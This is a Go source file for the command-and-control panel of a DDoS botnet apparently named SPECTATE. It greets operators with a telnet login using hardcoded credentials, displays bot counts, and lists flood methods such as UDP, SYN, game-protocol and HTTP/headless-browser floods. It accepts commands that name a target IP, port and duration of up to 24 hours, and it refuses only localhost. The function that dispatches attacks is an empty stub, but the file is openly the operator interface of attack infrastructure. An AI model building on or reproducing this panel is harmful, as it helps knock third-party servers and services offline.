package main

import (
	"bufio"
	"fmt"
	"net"
	"strings"
	"time"
)

type Admin struct {
	conn   net.Conn
	reader *bufio.Reader
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn, bufio.NewReader(conn)}
}

func (this *Admin) GetGradient(text string) string {
	if len(text) == 0 {
		return ""
	}
	if len(text) == 1 {
		return fmt.Sprintf("\x1b[38;2;255;0;0m%s", text)
	}
	result := ""
	for i, r := range text {
		ratio := float64(i) / float64(len(text)-1)
		g := int(255 * ratio)
		b := int(255 * ratio)
		result += fmt.Sprintf("\x1b[38;2;255;%d;%dm%c", g, b, r)
	}
	return result
}

func (this *Admin) GradientWrite(text string) {
	this.conn.Write([]byte(this.GetGradient(text)))
}

func (this *Admin) RevealWrite(lines []string, delay time.Duration) {
	for _, line := range lines {
		this.conn.Write([]byte(line))
		time.Sleep(delay)
	}
}

func (this *Admin) DisplayHome() {
	this.conn.Write([]byte("\033[2J\033[1H"))

	botCount := clientList.Count()

	content := []string{
		"\r\n",
		this.GetGradient("               ╔═╗╔═╗╔═╗╔═╗╔╦╗╔═╗╔╦╗╔═╗") + "\r\n",
		this.GetGradient("               ╚═╗╠═╝║╣ ║   ║ ╠═╣ ║ ║╣ ") + "\r\n",
		this.GetGradient("               ╚═╝╩  ╚═╝╚═╝ ╩ ╩ ╩ ╩ ╚═╝") + "\r\n",
		this.GetGradient("          ╚═╦═════════════════════════════════════╦═╝") + "\r\n",
		this.GetGradient("            ║") + "\x1b[38;2;255;255;255m Welcome to " + this.GetGradient("SPECTATE") + "\x1b[38;2;255;255;255m Terminal!       " + this.GetGradient("║") + "\r\n",
		this.GetGradient("            ║") + "\x1b[38;2;255;255;255m Systems are " + this.GetGradient("OPERATIONAL") + "\x1b[38;2;255;255;255m and ready!   " + this.GetGradient("║") + "\r\n",
		this.GetGradient("        ╚══╦╩═════════════════════════════════════╩╦══╝") + "\r\n",
		this.GetGradient("    ╚╦═════╩═══════════════════════════════════════╩═════╦╝") + "\r\n",
		fmt.Sprintf("\x1b[38;2;255;127;127m     ║\x1b[38;2;255;255;255m  Bots: \x1b[38;2;255;0;0m%-6d\x1b[38;2;255;255;255m | v3.0     \x1b[38;2;255;255;255m║\r\n", botCount),
		this.GetGradient("     ║") + "\x1b[38;2;255;255;255m  Connection established to " + this.GetGradient("SPECTATE") + "              " + this.GetGradient("║") + "\r\n",
		this.GetGradient("     ╚═══════════════════════════════════════════════════╝") + "\r\n",
		"\r\n",
	}

	for _, line := range content {
		this.conn.Write([]byte(line))
		time.Sleep(30 * time.Millisecond)
	}
}

func (this *Admin) SendApiAttack(target string, port string, duration string, method string) {
}

func (this *Admin) GetColor(index int, total int) string {
	if total <= 1 {
		return "\x1b[38;2;255;0;0m"
	}
	ratio := float64(index) / float64(total-1)
	g := int(255 * ratio)
	b := int(255 * ratio)
	return fmt.Sprintf("\x1b[38;2;255;%d;%dm", g, b)
}

func (this *Admin) DisplayAttackSent(target string, port string, duration string, method string, count int) {
	this.conn.Write([]byte("\033[2J\033[1H"))

	content := []string{
		"\r\n",
		this.GetGradient("         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗") + "\r\n",
		this.GetGradient("         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ ") + "\r\n",
		this.GetGradient("         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ ") + "\r\n",
		"\r\n",
		this.GetGradient("    ╚═╦═════════════════════════════════════╦═╝") + "\r\n",
		this.GetGradient("      ║") + "\x1b[38;2;255;255;255m      The attack has been sent!      " + this.GetGradient("║") + "\r\n",
		this.GetGradient("      ║") + "\x1b[38;2;255;255;255m  Real-Time Attack Sequence Engaged  " + this.GetGradient("║") + "\r\n",
		this.GetGradient("  ╚══╦╩═════════════════════════════════════╩╦══╝") + "\r\n",
		"  " + this.GetGradient("    █████████████████████████████████████████") + "\r\n",
		fmt.Sprintf("%s    ║ \x1b[38;2;255;255;255mStatus  ►  [\x1b[38;2;255;255;255mAttack Successfully Sent\x1b[38;2;255;255;255m]%s\r\n", this.GetColor(4, 12), this.GetColor(4, 12)),
		fmt.Sprintf("%s    ║ \x1b[38;2;255;255;255mHost    ►  [\x1b[38;2;255;0;0m%s\x1b[38;2;255;255;255m]%s\r\n", this.GetColor(5, 12), target, this.GetColor(5, 12)),
		fmt.Sprintf("%s    ║ \x1b[38;2;255;255;255mPort    ►  [\x1b[38;2;255;0;0m%s\x1b[38;2;255;255;255m]%s\r\n", this.GetColor(6, 12), port, this.GetColor(6, 12)),
		fmt.Sprintf("%s    ║ \x1b[38;2;255;255;255mTime    ►  [\x1b[38;2;255;0;0m%s\x1b[38;2;255;255;255m]%s\r\n", this.GetColor(7, 12), duration, this.GetColor(7, 12)),
		fmt.Sprintf("%s    ║ \x1b[38;2;255;255;255mMethod  ►  [\x1b[38;2;255;0;0m%s\x1b[38;2;255;255;255m]%s\r\n", this.GetColor(8, 12), strings.ToUpper(method), this.GetColor(8, 12)),
		fmt.Sprintf("%s    ║ \x1b[38;2;255;255;255mBots    ►  [\x1b[38;2;255;0;0m%d\x1b[38;2;255;255;255m]%s\r\n", this.GetColor(9, 12), count, this.GetColor(9, 12)),
		this.GetColor(10, 12) + "    ║\r\n",
		this.GetColor(11, 12) + "    ╚══════════════════════════════════════════════╝\r\n",
		"\r\n",
		"\x1b[38;2;255;255;255mType \"cls\" to return to home.\r\n",
	}

	for _, line := range content {
		this.conn.Write([]byte(line))
		time.Sleep(30 * time.Millisecond)
	}
}

func (this *Admin) DisplayMethods() {
	this.conn.Write([]byte("\033[2J\033[1H"))

	content := []string{
		"\r\n",
		this.GetGradient("╔══════════════════════════════════════════════════════════════════════════╗") + "\r\n",
		this.GetGradient("║                                Attack Methods                            ║") + "\r\n",
		this.GetGradient("╠══════════════════════════════════════════════════════════════════════════╣") + "\r\n",
		this.GetGradient("║                                                                          ║") + "\r\n",
		this.GetGradient("║                ─────────────── UDP  LAYER 4 ───────────────              ║") + "\r\n",
		this.GetGradient("║ ┌──────────────────────────────────────────────────────────────────────┐ ║") + "\r\n",
		this.GetGradient("║ │ udp.......... <target> <port> <time>  [Volumetric UDP Flood]         │ ║") + "\r\n",
		this.GetGradient("║ │ pps.......... <target> <port> <time>  [High PPS / CPU Killer]        │ ║") + "\r\n",
		this.GetGradient("║ │ raknet....... <target> <port> <time>  [RakNet Game Engine]           │ ║") + "\r\n",
		this.GetGradient("║ │ a2s.......... <target> <port> <time>  [Source Engine Query]          │ ║") + "\r\n",
		this.GetGradient("║ └──────────────────────────────────────────────────────────────────────┘ ║") + "\r\n",
		this.GetGradient("║                                                                          ║") + "\r\n",
		this.GetGradient("║                ─────────────── TCP  LAYER 4 ───────────────              ║") + "\r\n",
		this.GetGradient("║ ┌──────────────────────────────────────────────────────────────────────┐ ║") + "\r\n",
		this.GetGradient("║ │ tcp.......... <target> <port> <time>  [Pure TCP Handshake]           │ ║") + "\r\n",
		this.GetGradient("║ │ syn.......... <target> <port> <time>  [SYN Flood Attack]             │ ║") + "\r\n",
		this.GetGradient("║ │ mix.......... <target> <port> <time>  [TCP Mix Flooder]              │ ║") + "\r\n",
		this.GetGradient("║ │ game......... <target> <port> <time>  [Game Protocol Flood]          │ ║") + "\r\n",
		this.GetGradient("║ └──────────────────────────────────────────────────────────────────────┘ ║") + "\r\n",
		this.GetGradient("║                                                                          ║") + "\r\n",
		this.GetGradient("║                ─────────────── HTTP LAYER 7 ───────────────              ║") + "\r\n",
		this.GetGradient("║ ┌──────────────────────────────────────────────────────────────────────┐ ║") + "\r\n",
		this.GetGradient("║ │ flood........ <target> <port> <time>  [HTTP Full Flooder]            │ ║") + "\r\n",
		this.GetGradient("║ │ browser...... <target> <port> <time>  [Headless Browser Flood]       │ ║") + "\r\n",
		this.GetGradient("║ └──────────────────────────────────────────────────────────────────────┘ ║") + "\r\n",
		this.GetGradient("║                                                                          ║") + "\r\n",
		this.GetGradient("╠════════════════╦═══════════════╦═════════════════════════════════════════╣") + "\r\n",
		this.GetGradient("║ Support:       ║ [L4] ") + "\x1b[38;2;0;255;0mOnline" + this.GetGradient("   ║ clear | Back to main menu               ║") + "\r\n",
		this.GetGradient("║ @SPECTATE_BOT  ║ [L7] ") + "\x1b[38;2;0;255;0mOnline" + this.GetGradient("   ║ help  | methods | attack                ║") + "\r\n",
		this.GetGradient("╚════════════════╩═══════════════╩═════════════════════════════════════════╝") + "\r\n",
	}

	for _, line := range content {
		this.conn.Write([]byte(line))
		time.Sleep(30 * time.Millisecond)
	}
}

func (this *Admin) DisplayApi() {
	this.conn.Write([]byte("\033[2J\033[1H"))

	content := []string{
		"\r\n",
		this.GetGradient("╔══════════════════════════════════════════════════════════════════════════╗") + "\r\n",
		this.GetGradient("║                              API Documentation                           ║") + "\r\n",
		this.GetGradient("╠══════════════════════════════════════════════════════════════════════════╣") + "\r\n",
		this.GetGradient("║                                                                          ║") + "\r\n",
		this.GetGradient("║  No external API configured                                              ║") + "\r\n",
		this.GetGradient("║                                                                          ║") + "\r\n",
		this.GetGradient("╠══════════════════════════════════════════════════════════════════════════╣") + "\r\n",
		this.GetGradient("║ Type \"cls\" to return to home menu                                        ║") + "\r\n",
		this.GetGradient("╚══════════════════════════════════════════════════════════════════════════╝") + "\r\n",
	}

	for _, line := range content {
		this.conn.Write([]byte(line))
		time.Sleep(30 * time.Millisecond)
	}
}

func (this *Admin) DisplayAttackAnimation() {
	this.conn.Write([]byte("\033[2J\033[1H"))
	animation := []string{
		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣄⣠⣀⡀⣀⣠⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n",
		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⢀⣠⣼⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⢀⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n",
		"⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣟⣾⣿⣽⣿⣿⣅⠈⠉⠻⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⢀⡶⠒⢉⡀⢀⣤⣶⣶⣿⣷⣆⣀⡀⠀⢲⣖⠒⠀⠀⠀⠀⠀⠀⠀\r\n",
		"⢀⣤⣾⣶⣦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣽⡿⠻⣷⣀⠀⢻⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⣤⣶⣶⣤⣀⣀⣬⣷⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣦⣼⣀⠀\r\n",
		"⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⣿⣿⠟⠁⠘⣿⡟⠁⠀⠀⠘⠛⠁⠀⠀⢠⣾⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠙⠁\r\n",
		"⠀⠸⠟⠋⠀⠀⠈⠙⣿⣿⣿⣿⣿⣿⣷⣦⡄⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣼⣆⢘⣿⣯⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠉⢱⡿⠀⠀⠀⠀⠀\r\n",
		"⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡿⠦⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀\r\n",
		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⠿⠿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⣷⣦⣶⣦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀\r\n",
		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣤⡖⠛⠶⠤⡀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠙⣿⣿⠿⢻⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n",
		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⣤⣦⣤⣄⡀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n",
		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n",
		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n",
		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n",
		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n",
		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n",
	}

	for _, line := range animation {
		this.GradientWrite(line)
		time.Sleep(50 * time.Millisecond)
	}

	time.Sleep(2 * time.Second)
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
	this.conn.Write([]byte("\033[?1049h"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
		this.conn.Close()
	}()

	this.DisplayAttackAnimation()
	time.Sleep(1 * time.Second)

	this.conn.SetDeadline(time.Time{})

	var level int
	var licenseKey string

	for {
		this.conn.Write([]byte("\x1b]0;SPECTATE | Authentication\x07"))
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\r\n"))
		this.GradientWrite("               ╔═╗╔═╗╔═╗╔═╗╔╦╗╔═╗╔╦╗╔═╗\r\n")
		this.GradientWrite("               ╚═╗╠═╝║╣ ║   ║ ╠═╣ ║ ║╣ \r\n")
		this.GradientWrite("               ╚═╝╩  ╚═╝╚═╝ ╩ ╩ ╩ ╩ ╚═╝\r\n")
		this.conn.Write([]byte("\r\n"))
		this.conn.Write([]byte("\x1b[38;2;255;255;255m  [1] Login\r\n"))
		this.conn.Write([]byte("\r\n"))
		this.conn.Write([]byte("\x1b[38;2;255;255;255m  Selection\x1b[38;2;255;0;0m:\x1b[38;2;255;255;255m "))

		choice, err := this.ReadLine()
		if err != nil {
			return
		}

		if choice == "1" {
			this.conn.Write([]byte("\r\n\x1b[38;2;255;255;255m  Username\x1b[38;2;255;0;0m:\x1b[38;2;255;255;255m "))
			user, _ := this.ReadLine()
			this.conn.Write([]byte("\x1b[38;2;255;255;255m  Password\x1b[38;2;255;0;0m:\x1b[38;2;255;255;255m "))
			pass, _ := this.ReadLine()

			ip := strings.Split(this.conn.RemoteAddr().String(), ":")[0]
			this.conn.Write([]byte("\r\x1b[38;5;231m  Authenticating\x1b[38;5;196m...\x1b[0m"))

			if user == "root-zero" && pass == "root-fear" {
				if last, exists := lastLogins[user]; exists {
					if last.IP != ip && time.Since(last.Timestamp) < 10*time.Minute {
						go SendWebhook("🚨 MULTI-LOGIN ALERT!", fmt.Sprintf("**User:** `%s`\n**Current IP:** `%s`\n**Previous IP:** `%s`\n**Time Since Last:** %v", user, ip, last.IP, time.Since(last.Timestamp).Round(time.Second)), 0xFF0000)
					}
				}

				lastLogins[user] = LoginSession{IP: ip, Timestamp: time.Now()}

				level = 3
				licenseKey = user
				this.conn.Write([]byte("\r\n\x1b[38;2;0;255;0m  Access Granted! Welcome back.\x1b[0m\r\n"))
				time.Sleep(1 * time.Second)
				go SendWebhook("✅ Login Success", fmt.Sprintf("**User:** `%s`\n**IP:** `%s`\n**Level:** %d", user, ip, level), 0x00FF00)
				break
			} else {
				this.conn.Write([]byte("\r\n\x1b[38;2;255;0;0m  Access Denied: Invalid credentials\x1b[0m\r\n"))
				time.Sleep(2 * time.Second)
				continue
			}
		}
	}

	this.DisplayHome()

	userInfo := AccountInfo{username: licenseKey, maxBots: -1, admin: 0, hwid: "CNC-Spectate", level: level}

	go func() {
		for {
			botCount := clientList.Count()
			fmt.Fprintf(this.conn, "\x1b]0;SPECTATE | Bots: %d\x07", botCount)
			time.Sleep(2 * time.Second)
		}
	}()

	attackSent := false
	currentMenu := "home"

	for {
		this.conn.Write([]byte("\x1b[38;2;255;0;0m╔═\x1b[38;2;255;255;255mSPECTATE\x1b[38;2;255;0;0m══\x1b[38;2;255;255;255m$\r\n"))
		this.conn.Write([]byte("\x1b[38;2;255;0;0m╚═\x1b[38;2;255;255;255m➢ "))

		if !attackSent {
			this.conn.SetReadDeadline(time.Now().Add(1200 * time.Second))
		} else {
			this.conn.SetReadDeadline(time.Time{})
		}

		cmd, err := this.ReadLine()

		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				this.DisplayHome()
				currentMenu = "home"
				attackSent = false
				continue
			}
			return
		}

		this.conn.SetReadDeadline(time.Time{})
		if cmd == "" {
			continue
		}
		if cmd == "exit" || cmd == "quit" || cmd == "logout" {
			return
		}

		attackSent = false

		handleError := func(msg string) {
			this.conn.Write([]byte("\r\n\x1b[38;2;255;0;0mERROR: " + msg + "\x1b[0m\r\n"))
			time.Sleep(1 * time.Second)
			switch currentMenu {
			case "methods":
				this.DisplayMethods()
			case "api":
				this.DisplayApi()
			case "help":
				this.conn.Write([]byte("\033[2J\033[1H"))
				content := []string{
					"\r\n",
					this.GetGradient("╔══════════════════════════════════════════════════════════════════════════╗") + "\r\n",
					this.GetGradient("║                               SPECTATE HELP                              ║") + "\r\n",
					this.GetGradient("╠══════════════════════════════════════════════════════════════════════════╣") + "\r\n",
					this.GetGradient("║                                                                          ║") + "\r\n",
					this.GetGradient("║  METHODS ....... Shows all available attack methods                      ║") + "\r\n",
					this.GetGradient("║  API ........... Shows API documentation and endpoint                    ║") + "\r\n",
					this.GetGradient("║  RULES ......... READ this shit or get banned                            ║") + "\r\n",
					this.GetGradient("║  CLS ........... Clears your terminal screen                             ║") + "\r\n",
					this.GetGradient("║  LOGOUT ........ Logs you out of the terminal                            ║") + "\r\n",
					this.GetGradient("║                                                                          ║") + "\r\n",
					this.GetGradient("║  Usage: [METH] [IP] [PORT] [TIME]                                        ║") + "\r\n",
					this.GetGradient("║  Example: UDP 1.1.1.1 80 80                                              ║") + "\r\n",
					this.GetGradient("╠══════════════════════════════════════════════════════════════════════════╣") + "\r\n",
					this.GetGradient("║ Type \"cls\" to return to home menu                                        ║") + "\r\n",
					this.GetGradient("╚══════════════════════════════════════════════════════════════════════════╝") + "\r\n",
				}
				for _, line := range content {
					this.conn.Write([]byte(line))
					time.Sleep(30 * time.Millisecond)
				}
			default:
				this.DisplayHome()
			}
		}

		cmdLower := strings.ToLower(cmd)
		if cmdLower == "cls" || cmdLower == "clear" || cmdLower == "home" || cmdLower == "/home" {
			this.DisplayHome()
			currentMenu = "home"
			continue
		}

		if cmdLower == "help" || cmdLower == "?" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			content := []string{
				"\r\n",
				this.GetGradient("╔══════════════════════════════════════════════════════════════════════════╗") + "\r\n",
				this.GetGradient("║                               SPECTATE HELP                              ║") + "\r\n",
				this.GetGradient("╠══════════════════════════════════════════════════════════════════════════╣") + "\r\n",
				this.GetGradient("║                                                                          ║") + "\r\n",
				this.GetGradient("║  METHODS ....... Shows all available attack methods                      ║") + "\r\n",
				this.GetGradient("║  API ........... Shows API documentation and endpoint                    ║") + "\r\n",
				this.GetGradient("║  RULES ......... READ this shit or get banned                            ║") + "\r\n",
				this.GetGradient("║  CLS ........... Clears your terminal screen                             ║") + "\r\n",
				this.GetGradient("║  LOGOUT ........ Logs you out of the terminal                            ║") + "\r\n",
				this.GetGradient("║                                                                          ║") + "\r\n",
				this.GetGradient("║  Usage: [METH] [IP] [PORT] [TIME]                                        ║") + "\r\n",
				this.GetGradient("║  Example: UDP 1.1.1.1 80 80                                              ║") + "\r\n",
				this.GetGradient("╠══════════════════════════════════════════════════════════════════════════╣") + "\r\n",
				this.GetGradient("║ Type \"cls\" to return to home menu                                        ║") + "\r\n",
				this.GetGradient("╚══════════════════════════════════════════════════════════════════════════╝") + "\r\n",
			}
			for _, line := range content {
				this.conn.Write([]byte(line))
				time.Sleep(30 * time.Millisecond)
			}
			currentMenu = "help"
			continue
		}

		if cmdLower == "methods" {
			this.DisplayMethods()
			currentMenu = "methods"
			continue
		}

		if cmdLower == "api" {
			this.DisplayApi()
			currentMenu = "api"
			continue
		}

		cmdParts := strings.Split(cmd, " ")
		if len(cmdParts) < 4 {
			handleError("Usage: [METHOD] [TARGET] [PORT] [TIME]")
			continue
		}

		method := strings.ToLower(cmdParts[0])
		target := cmdParts[1]
		port := cmdParts[2]
		timeStr := cmdParts[3]

		var duration int
		fmt.Sscanf(timeStr, "%d", &duration)

		if duration < 1 || duration > 86400 {
			handleError("Duration must be between 1 and 86400 seconds!")
			continue
		}

		blockedIPs := []string{"127.0.0.1", "localhost"}
		isBlocked := false
		for _, ip := range blockedIPs {
			if target == ip {
				isBlocked = true
				break
			}
		}

		if isBlocked {
			handleError("This IP is protected!")
			continue
		}

		this.SendApiAttack(target, port, timeStr, method)
		this.DisplayAttackAnimation()
		this.DisplayAttackSent(target, port, timeStr, method, clientList.Count())
		attackSent = true
		currentMenu = "home"
	}
}

func (this *Admin) ReadLine() (string, error) {
	line, err := this.reader.ReadString('\n')
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(line), nil
}
